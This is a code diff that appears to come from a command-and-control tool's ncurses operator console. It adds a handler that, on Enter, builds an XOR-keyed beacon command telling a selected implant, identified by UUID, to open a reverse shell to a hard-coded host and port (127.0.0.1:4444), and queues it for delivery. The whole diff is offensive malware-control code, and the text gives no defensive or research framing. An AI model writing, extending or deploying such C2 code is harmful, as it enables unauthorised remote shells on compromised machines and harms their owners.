@@ -280,7 +280,8 @@ bool ncurses_wmain_update(WINDOW *win_main){
 
 bool ncurses_wcmd_shell(WINDOW *win_main,
                         WINDOW *win_menu,
-                        char *uuid){
+                        char *uuid,
+                        net_server_beacon_t **p_commands){
   int key;
   int y, x;
   getmaxyx(win_main, y, x);
@@ -425,6 +426,17 @@ bool ncurses_wcmd_shell(WINDOW *win_main,
       continue;
     } else if (key == '\t'){
       form_driver(form, REQ_NEXT_FIELD);
+    } else if (key == 10 || key == KEY_ENTER){
+      net_server_cmd_shell_t cmd_shell;
+      strcpy(cmd_shell.host, "127.0.0.1");
+      cmd_shell.port = 4444;
+      net_server_beacon_t cmd_beacon;
+      cmd_beacon.xor_key = DEFS_XOR_KEY;
+      cmd_beacon.status = true;
+      cmd_beacon.command = 1;
+      strcpy(cmd_beacon.uuid, uuid);
+      memcpy(cmd_beacon.data, &cmd_shell, sizeof(net_server_cmd_shell_t));
+      net_update_commands(&cmd_beacon, p_commands);
     } else {
       form_driver(form, key);
       continue;
@@ -687,7 +699,7 @@ bool ncurses_main(int port){
       strncpy(uuid, item_name(item), SYS_UUID_SIZE);
       int option = ncurses_wcmd_select(win_main, win_menu, uuid);
       if (option == NCF_OPTS_SHELL){
-        ncurses_wcmd_shell(win_main, win_menu, uuid);
+        ncurses_wcmd_shell(win_main, win_menu, uuid, p_commands);
       }
       wclear(win_main);
       wclear(win_menu);
